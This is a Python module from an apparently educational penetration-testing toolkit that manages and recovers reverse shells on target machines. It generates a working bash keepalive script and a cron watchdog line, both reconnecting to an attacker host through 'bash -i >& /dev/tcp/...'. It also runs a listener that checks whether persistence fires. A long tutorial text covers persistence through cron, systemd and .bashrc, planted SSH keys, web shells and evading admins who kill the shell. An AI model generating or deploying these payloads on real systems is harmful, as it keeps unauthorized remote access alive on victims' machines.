"""
Shell recovery and monitoring functionality
"""

import time
import subprocess
import socket
from typing import Dict, List, Optional, Callable
from datetime import datetime
from learnshells.utils.logger import Logger


class ShellRecovery:
    """Monitor shells and handle automatic recovery."""
    
    def __init__(self, logger: Logger = None):
        """
        Initialize shell recovery manager.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or Logger()
        self.active_shells = {}
        self.recovery_enabled = False
        self.monitoring = False
    
    def register_shell(
        self,
        shell_id: str,
        target_ip: str,
        connection_info: Dict
    ):
        """
        Register a shell for monitoring.
        
        Args:
            shell_id: Unique shell identifier
            target_ip: Target IP address
            connection_info: Connection details
        """
        self.active_shells[shell_id] = {
            "target_ip": target_ip,
            "connection_info": connection_info,
            "status": "active",
            "last_seen": datetime.now(),
            "reconnect_attempts": 0,
            "max_reconnect_attempts": 5,
            "created_at": datetime.now()
        }
        
        self.logger.success(
            f"Shell {shell_id} registered for monitoring",
            explain="This shell will be monitored for health. "
                   "If it dies, recovery mechanisms can automatically reconnect."
        )
    
    def unregister_shell(self, shell_id: str):
        """
        Unregister a shell from monitoring.
        
        Args:
            shell_id: Shell identifier
        """
        if shell_id in self.active_shells:
            del self.active_shells[shell_id]
            self.logger.info(f"Shell {shell_id} unregistered")
    
    def check_shell_health(self, shell_id: str) -> bool:
        """
        Check if a shell is still alive.
        
        Args:
            shell_id: Shell identifier
            
        Returns:
            bool: True if shell is healthy
        """
        if shell_id not in self.active_shells:
            return False
        
        shell = self.active_shells[shell_id]
        target_ip = shell["target_ip"]
        
        # Simple ping check
        try:
            result = subprocess.run(
                ['ping', '-c', '1', '-W', '2', target_ip],
                capture_output=True,
                timeout=3
            )
            
            if result.returncode == 0:
                shell["status"] = "active"
                shell["last_seen"] = datetime.now()
                return True
            else:
                shell["status"] = "unreachable"
                return False
                
        except Exception as e:
            self.logger.debug(f"Health check failed for {shell_id}: {e}")
            shell["status"] = "unknown"
            return False
    
    def monitor_shells(self, interval: int = 30, callback: Optional[Callable] = None):
        """
        Monitor all registered shells continuously.
        
        Args:
            interval: Check interval in seconds
            callback: Optional callback function when shell dies
        """
        self.monitoring = True
        self.logger.success(
            f"Shell monitoring started (interval: {interval}s)",
            explain="Monitoring will check shell health regularly. "
                   "Dead shells will trigger recovery if enabled."
        )
        
        try:
            while self.monitoring:
                for shell_id in list(self.active_shells.keys()):
                    is_healthy = self.check_shell_health(shell_id)
                    
                    if not is_healthy:
                        self.logger.warning(f"Shell {shell_id} appears dead")
                        
                        if self.recovery_enabled:
                            self._attempt_recovery(shell_id)
                        
                        if callback:
                            callback(shell_id, self.active_shells[shell_id])
                
                time.sleep(interval)
                
        except KeyboardInterrupt:
            self.logger.info("Monitoring stopped by user")
            self.monitoring = False
    
    def stop_monitoring(self):
        """Stop shell monitoring."""
        self.monitoring = False
        self.logger.info("Shell monitoring stopped")
    
    def _attempt_recovery(self, shell_id: str):
        """
        Attempt to recover a dead shell.
        
        Args:
            shell_id: Shell identifier
        """
        shell = self.active_shells[shell_id]
        
        if shell["reconnect_attempts"] >= shell["max_reconnect_attempts"]:
            self.logger.error(
                f"Shell {shell_id} exceeded max reconnect attempts",
                explain="Maximum reconnection attempts reached. "
                       "Check persistence mechanisms or manually reconnect."
            )
            shell["status"] = "failed"
            return
        
        shell["reconnect_attempts"] += 1
        
        self.logger.info(
            f"Attempting to recover shell {shell_id} "
            f"(attempt {shell['reconnect_attempts']}/{shell['max_reconnect_attempts']})"
        )
        
        # Try to trigger persistence mechanisms
        # This would need to be implemented based on installed persistence
        connection_info = shell["connection_info"]
        
        # Wait a bit before next attempt
        time.sleep(10)
    
    def enable_recovery(self):
        """Enable automatic shell recovery."""
        self.recovery_enabled = True
        self.logger.success(
            "Automatic recovery enabled",
            explain="Dead shells will automatically attempt to reconnect. "
                   "Make sure persistence mechanisms are installed first!"
        )
    
    def disable_recovery(self):
        """Disable automatic shell recovery."""
        self.recovery_enabled = False
        self.logger.info("Automatic recovery disabled")
    
    def get_shell_status(self, shell_id: str) -> Optional[Dict]:
        """
        Get status of a specific shell.
        
        Args:
            shell_id: Shell identifier
            
        Returns:
            Shell status dict or None
        """
        return self.active_shells.get(shell_id)
    
    def list_shells(self) -> List[Dict]:
        """
        List all registered shells.
        
        Returns:
            List of shell information
        """
        shells = []
        
        for shell_id, info in self.active_shells.items():
            shells.append({
                "id": shell_id,
                "target": info["target_ip"],
                "status": info["status"],
                "last_seen": info["last_seen"],
                "uptime": str(datetime.now() - info["created_at"]),
                "reconnect_attempts": info["reconnect_attempts"]
            })
        
        return shells
    
    def display_shell_status(self):
        """Display status of all shells in a formatted table."""
        self.logger.header("Active Shells Status")
        
        if not self.active_shells:
            self.logger.warning("No shells registered")
            return
        
        shells = self.list_shells()
        
        headers = ["ID", "Target", "Status", "Uptime", "Attempts"]
        rows = []
        
        for shell in shells:
            # Color code status
            status = shell["status"]
            if status == "active":
                status_str = f"{self.logger.Colors.GREEN}●{self.logger.Colors.RESET} Active"
            elif status == "unreachable":
                status_str = f"{self.logger.Colors.RED}●{self.logger.Colors.RESET} Dead"
            elif status == "failed":
                status_str = f"{self.logger.Colors.RED}✗{self.logger.Colors.RESET} Failed"
            else:
                status_str = f"{self.logger.Colors.YELLOW}?{self.logger.Colors.RESET} Unknown"
            
            rows.append([
                shell["id"],
                shell["target"],
                status_str,
                shell["uptime"],
                shell["reconnect_attempts"]
            ])
        
        self.logger.table(headers, rows)
    
    def generate_keepalive_script(
        self,
        lhost: str,
        lport: int,
        check_interval: int = 60
    ) -> str:
        """
        Generate a keepalive script to run on target.
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            check_interval: Check interval in seconds
            
        Returns:
            Keepalive script
        """
        script = f"""#!/bin/bash
# Shell keepalive script
LHOST="{lhost}"
LPORT={lport}
INTERVAL={check_interval}

while true; do
    # Check if connection is alive
    if ! pgrep -f "/dev/tcp/$LHOST/$LPORT" > /dev/null; then
        # Connection dead, reconnect
        bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &
    fi
    sleep $INTERVAL
done
"""
        
        self.logger.success(
            "Generated keepalive script",
            explain="This script runs on target and automatically reconnects "
                   "if the shell dies. Run it in background: nohup ./keepalive.sh &"
        )
        
        return script
    
    def generate_watchdog_cron(
        self,
        lhost: str,
        lport: int
    ) -> str:
        """
        Generate cron job that acts as watchdog.
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            
        Returns:
            Cron line
        """
        # Check every minute if shell is running, if not, reconnect
        cron_line = f"* * * * * pgrep -f '/dev/tcp/{lhost}/{lport}' || bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        
        self.logger.success(
            "Generated watchdog cron job",
            explain="This cron job checks every minute if shell is running. "
                   "If not, it automatically reconnects."
        )
        
        return cron_line
    
    def test_persistence_trigger(
        self,
        lhost: str,
        lport: int,
        method: str = "cron"
    ) -> bool:
        """
        Test if persistence mechanism can be triggered.
        
        Args:
            lhost: Attacker IP
            lport: Attacker port
            method: Persistence method to test
            
        Returns:
            bool: True if test successful
        """
        self.logger.info(f"Testing {method} persistence trigger...")
        
        # Start a temporary listener
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(30)
            sock.bind((lhost, lport))
            sock.listen(1)
            
            self.logger.info(f"Listening on {lhost}:{lport} for 30 seconds...")
            self.logger.info("Trigger persistence mechanism now!")
            
            conn, addr = sock.accept()
            
            self.logger.success(
                f"Connection received from {addr[0]}!",
                explain="Persistence mechanism is working correctly. "
                       "Shell will reconnect automatically when it dies."
            )
            
            conn.close()
            sock.close()
            return True
            
        except socket.timeout:
            self.logger.error(
                "No connection received",
                explain="Persistence mechanism didn't trigger. "
                       "Check installation and timing configuration."
            )
            return False
        except Exception as e:
            self.logger.error(f"Test failed: {e}")
            return False
    
    def diagnose_connection_loss(
        self,
        target_ip: str,
        lhost: str,
        lport: int
    ) -> List[Dict]:
        """
        Diagnose why connection was lost.
        
        Args:
            target_ip: Target IP
            lhost: Your IP
            lport: Your listening port
            
        Returns:
            List of potential issues
        """
        self.logger.header("Connection Loss Diagnosis")
        
        issues = []
        
        # Check 1: Can we reach target?
        self.logger.info("Checking if target is reachable...")
        try:
            result = subprocess.run(
                ['ping', '-c', '3', target_ip],
                capture_output=True,
                timeout=10
            )
            
            if result.returncode == 0:
                self.logger.success("✓ Target is reachable")
            else:
                issues.append({
                    "issue": "Target unreachable",
                    "severity": "high",
                    "solution": "Target may be offline or network issue"
                })
                self.logger.error("✗ Target is not responding to ping")
        except Exception as e:
            issues.append({
                "issue": "Cannot ping target",
                "severity": "high",
                "solution": str(e)
            })
        
        # Check 2: Is our listener port available?
        self.logger.info(f"Checking if port {lport} is available...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('', lport))
            sock.close()
            self.logger.success(f"✓ Port {lport} is available")
        except OSError:
            issues.append({
                "issue": f"Port {lport} is in use",
                "severity": "medium",
                "solution": "Kill process using port or use different port"
            })
            self.logger.warning(f"⚠ Port {lport} is already in use")
        
        # Check 3: Is VPN still connected?
        self.logger.info("Checking VPN connectivity...")
        # This would check VPN interface
        # Simplified for now
        
        # Display findings
        if issues:
            self.logger.error(f"\nFound {len(issues)} potential issues:")
            for issue in issues:
                self.logger.list_item(f"{issue['issue']} (Severity: {issue['severity']})")
                self.logger.list_item(f"  → {issue['solution']}", indent=1)
        else:
            self.logger.success("\nNo obvious issues found")
            self.logger.info("Connection loss may be due to:")
            self.logger.list_item("Target process killed")
            self.logger.list_item("Firewall blocking")
            self.logger.list_item("Network instability")
            self.logger.list_item("Payload crashed")
        
        return issues
    
    def suggest_recovery_actions(self, shell_id: str) -> List[str]:
        """
        Suggest actions to recover a lost shell.
        
        Args:
            shell_id: Shell identifier
            
        Returns:
            List of suggested actions
        """
        if shell_id not in self.active_shells:
            return ["Shell not found in registry"]
        
        shell = self.active_shells[shell_id]
        suggestions = []
        
        # Check reconnect attempts
        if shell["reconnect_attempts"] < shell["max_reconnect_attempts"]:
            suggestions.append("Wait for automatic reconnection attempt")
        else:
            suggestions.append("Manual reconnection required (max attempts exceeded)")
        
        # General suggestions
        suggestions.extend([
            "Check if persistence mechanisms are installed",
            "Verify target is still reachable (ping)",
            "Check if listener port is available",
            "Try triggering persistence manually",
            "Review firewall rules on both sides",
            "Check VPN connection status",
            "Re-exploit if necessary"
        ])
        
        self.logger.header("Recovery Suggestions")
        for i, suggestion in enumerate(suggestions, 1):
            self.logger.numbered_item(i, suggestion)
        
        return suggestions
    
    def explain_recovery(self) -> str:
        """Explain shell recovery concepts."""
        explanation = """
🎓 SHELL RECOVERY EXPLAINED:

Why Shells Die:
Reverse shells are fragile connections that can die from:
• Network interruptions
• Target process killed
• Firewall changes
• System reboot
• User logout
• Connection timeout
• Payload crashes

What is Shell Recovery?
Shell recovery is the automatic or manual process of
re-establishing connection after it's lost.

Recovery Strategies:

1. AUTOMATIC RECOVERY (Persistence-Based):
   Install persistence mechanisms that automatically
   reconnect:
   • Cron jobs (every N minutes)
   • Systemd services (restart on failure)
   • Login triggers (.bashrc)
   
   Pros: Hands-free, reliable
   Cons: Requires pre-installation

2. MANUAL RECOVERY:
   Re-exploit or manually trigger reconnection:
   • Re-run exploit
   • Trigger web backdoor
   • SSH with planted key
   
   Pros: Works without persistence
   Cons: Requires manual action

3. KEEPALIVE SCRIPTS:
   Script running on target that monitors connection
   and reconnects if it dies:
   
   while true; do
       if ! pgrep -f "shell_process"; then
           reconnect
       fi
       sleep 60
   done
   
   Pros: Proactive, quick recovery
   Cons: Uses system resources

4. WATCHDOG CRON:
   Cron job that checks if shell is running:
   
   * * * * * pgrep -f 'shell' || reconnect
   
   Pros: Minimal resource use
   Cons: 1 minute delay

Monitoring Shell Health:

Connection Check:
• Ping target regularly
• Check if process exists
• Test network connectivity
• Verify listener is running

Health Indicators:
✓ Regular traffic
✓ Responsive to commands
✓ Stable connection
✗ Timeouts
✗ No response
✗ Connection errors

Recovery Process:

1. Detection:
   Monitor detects shell is dead

2. Diagnosis:
   Determine why it died:
   • Network issue?
   • Process killed?
   • System reboot?

3. Recovery Attempt:
   Try to reconnect:
   • Wait for persistence trigger
   • Manually trigger backdoor
   • Re-exploit

4. Verification:
   Confirm shell is back:
   • Test connectivity
   • Execute test command
   • Verify functionality

5. Logging:
   Record incident:
   • When it died
   • Why it died
   • How recovered
   • Time to recover

Best Practices:

1. Multiple Persistence Methods:
   Don't rely on one mechanism:
   • Install 2-3 different methods
   • Different trigger conditions
   • Different recovery timings

2. Health Monitoring:
   Actively monitor shells:
   • Regular connectivity checks
   • Resource monitoring
   • Alert on disconnection

3. Quick Response:
   Minimize downtime:
   • Automatic reconnection
   • Backup access methods
   • Fast manual recovery path

4. Learn from Failures:
   Understand why shells die:
   • Improve stability
   • Better persistence
   • More resilient payloads

Common Recovery Scenarios:

Scenario 1: Network Interruption
Problem: Connection dropped
Solution: Wait for cron job to reconnect

Scenario 2: System Reboot
Problem: All processes killed
Solution: Systemd service restarts on boot

Scenario 3: Process Killed by Admin
Problem: Shell process terminated
Solution: Cron job reconnects in 5 minutes

Scenario 4: Firewall Change
Problem: Port blocked
Solution: Try alternative port/method

Scenario 5: Payload Crashed
Problem: Buggy payload died
Solution: More stable payload + restart

Recovery Tools:

1. Monitoring Scripts:
   Watch shell health continuously

2. Auto-reconnect Cron:
   Scheduled reconnection attempts

3. Keepalive Daemons:
   Background process maintaining connection

4. Watchdog Services:
   Service that restarts shell if dead

5. Multiple Access Methods:
   SSH keys, web shells, scheduled tasks

Prevention vs Recovery:

Prevention (Better):
✓ Stable payloads
✓ Error handling
✓ Connection resilience
✓ Resource efficiency

Recovery (Necessary):
✓ Automatic reconnection
✓ Multiple methods
✓ Fast response
✓ Backup access

Remember:
The best recovery is not needing it!
Build stable shells and robust persistence.
"""
        return explanation
    
    def get_recovery_checklist(self) -> List[tuple]:
        """
        Get checklist for shell recovery setup.
        
        Returns:
            List of (item, completed) tuples
        """
        checklist = [
            ("Install at least one persistence mechanism", False),
            ("Test persistence triggers work", False),
            ("Set up monitoring for shell health", False),
            ("Enable automatic recovery", False),
            ("Document recovery procedures", False),
            ("Install backup access method (SSH key)", False),
            ("Configure keepalive scripts", False),
            ("Test manual recovery process", False),
            ("Set up alerting for shell death", False),
            ("Prepare re-exploitation path", False)
        ]
        
        return checklist
    
    def display_recovery_checklist(self):
        """Display recovery setup checklist."""
        self.logger.header("Shell Recovery Checklist")
        
        checklist = self.get_recovery_checklist()
        self.logger.checklist(checklist)
        
        self.logger.tip(
            "Complete these items to ensure you can recover from shell loss. "
            "The more redundancy, the better!"
        )
